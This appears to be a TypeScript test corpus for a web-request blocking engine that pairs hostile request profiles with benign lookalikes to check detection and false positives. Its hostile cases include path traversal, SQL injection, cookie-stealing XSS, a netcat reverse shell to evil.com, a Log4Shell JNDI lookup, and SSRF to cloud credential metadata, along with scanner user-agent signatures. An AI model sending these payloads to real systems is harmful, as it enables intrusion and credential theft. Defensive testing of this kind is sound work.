/**
 * Forcefield adversarial corpus: a growing set of hostile AND benign request
 * profiles that model how real agents behave, used to VERIFY the deterministic
 * engine actually blocks what it profiles and never blocks a real visitor.
 *
 * This is the "use our own agents to harden the tool" seam: the corpus is the
 * test target. It is run (1) in CI against the real decideEnforcement engine
 * (adversarial-corpus.test.ts), and (2) by a live script against a deployed shim
 * for the true end-to-end proof. New tradecraft (including AI-generated novel
 * attacks, produced OFFLINE in the factory) is added here as a case; the engine
 * stays deterministic.
 *
 * Each case is a request profile + what the engine must do. Benign cases are the
 * most important: a defense that false-positives on real users is worse than one
 * that misses an attacker.
 */
import type { BlockReasonKind } from "./enforce";

export interface AdversarialCase {
  name: string;
  /** hostile = must block; benign = must never block; recon = report-only (allow). */
  kind: "hostile" | "benign" | "recon";
  input: {
    path: string;
    rawUrl?: string;
    method: string;
    userAgent: string;
    headerNames: string[];
  };
  expectBlock: boolean;
  /** When expectBlock, the reason class the engine should fire. */
  expectReason?: BlockReasonKind;
}

const BROWSER_HEADERS = ["host", "user-agent", "accept", "accept-language", "accept-encoding", "cookie"];
const BROWSER_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36";

const tool = (name: string, ua: string): AdversarialCase => ({
  name: `attack tool: ${name}`,
  kind: "hostile",
  input: { path: "/", method: "GET", userAgent: ua, headerNames: ["host", "user-agent"] },
  expectBlock: true,
  expectReason: "attack_tool",
});

const payload = (name: string, rawUrl: string): AdversarialCase => ({
  name: `payload: ${name}`,
  kind: "hostile",
  input: { path: rawUrl.split("?")[0], rawUrl, method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS },
  expectBlock: true,
  expectReason: "payload",
});

export const ADVERSARIAL_CORPUS: readonly AdversarialCase[] = [
  // Decoy / honeytoken trip: the single highest-confidence hostile signal.
  { name: "honeytoken trap trip", kind: "hostile", input: { path: "/_ff/records", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: true, expectReason: "decoy" },

  // Named attack / recon tooling (the UA is the tell).
  tool("sqlmap", "sqlmap/1.7.2#stable (http://sqlmap.org)"),
  tool("Nikto", "Mozilla/5.00 (Nikto/2.1.6)"),
  tool("Nmap", "Mozilla/5.0 (compatible; Nmap Scripting Engine)"),
  tool("masscan", "masscan/1.3"),
  tool("Nuclei", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"),
  tool("WPScan", "WPScan v3.8.22"),
  tool("gobuster", "gobuster/3.6"),
  tool("ffuf", "Fuzz Faster U Fool v2.1.0-dev (ffuf)"),
  tool("Acunetix", "Mozilla/5.0 (Acunetix Web Vulnerability Scanner)"),

  // Injection payloads (seen in the query/raw URL).
  payload("path traversal", "/wp-content/plugins/x/dompdf/dompdf.php?p=../../../../etc/passwd"),
  payload("SQL injection", "/wp-admin/admin-ajax.php?id=1%20UNION%20SELECT%20password%20FROM%20users"),
  payload("XSS", "/search?q=<script>alert(document.cookie)</script>"),
  payload("command injection", "/ping?host=127.0.0.1;cat%20/etc/passwd"),
  payload("XXE marker", "/api/import?data=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"),
  // Expanded attack-surface coverage: classes a capable agent probes that the
  // engine now blocks. Each is something a legitimate request never carries.
  payload("command injection via pipe to netcat", "/ping?host=8.8.8.8|nc%20evil.com%204444%20-e%20/bin/sh"),
  payload("command substitution", "/report?title=$(whoami)"),
  payload("SSTI arithmetic probe", "/greet?name={{7*7}}"),
  payload("SSTI sandbox escape", "/render?tpl={{self.__class__.__mro__}}"),
  payload("Log4Shell JNDI lookup", "/api/log?ua=${jndi:ldap://evil.example.com/x}"),
  payload("CRLF HTTP response splitting", "/go?u=%0d%0aSet-Cookie:%20sessionid=attacker"),
  payload("NoSQL operator injection", "/login?user[$ne]=1&pass[$ne]=1"),
  payload("SSRF to cloud metadata", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
  payload("SSRF via gopher to internal redis", "/proxy?target=gopher://127.0.0.1:6379/_INFO"),

  // Benign: must NEVER be blocked (a false positive is the worst outcome).
  { name: "real browser, normal page", kind: "benign", input: { path: "/pricing", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "real browser, search with safe query", kind: "benign", input: { path: "/search", rawUrl: "/search?q=best+running+shoes", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "Googlebot (good bot)", kind: "benign", input: { path: "/", method: "GET", userAgent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", headerNames: ["host", "user-agent", "accept"] }, expectBlock: false },
  { name: "API client, valid JSON GET", kind: "benign", input: { path: "/api/products", rawUrl: "/api/products?limit=20", method: "GET", userAgent: "MyApp/1.0", headerNames: ["host", "user-agent", "accept", "authorization"] }, expectBlock: false },
  // Lookalikes for the expanded payload classes: payload-SHAPED but legitimate, so
  // they must NEVER block. These guard the new signatures against false positives.
  { name: "benign pipe in a sort field (not a shell command)", kind: "benign", input: { path: "/products", rawUrl: "/products?sort=name|id&order=asc", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "benign template braces without an arithmetic/escape probe", kind: "benign", input: { path: "/docs/templating", rawUrl: "/docs/templating?example={{name}}", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "benign dollar amount in a query", kind: "benign", input: { path: "/search", rawUrl: "/search?q=%24100+laptop", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "benign relative image src (no scheme, not SSRF)", kind: "benign", input: { path: "/gallery", rawUrl: "/gallery?img=/assets/logo.png", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
  { name: "benign external https share link is allowed by payload scan (open-redirect handled separately)", kind: "benign", input: { path: "/help", rawUrl: "/help?topic=billing", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },

  // Recon: suspicious but NOT proven-hostile -> report-only, never blocked (so we
  // never block a curious-but-harmless visitor; the probe is still recorded).
  { name: "bare sensitive-path probe (.env)", kind: "recon", input: { path: "/.env", method: "GET", userAgent: BROWSER_UA, headerNames: BROWSER_HEADERS }, expectBlock: false },
];
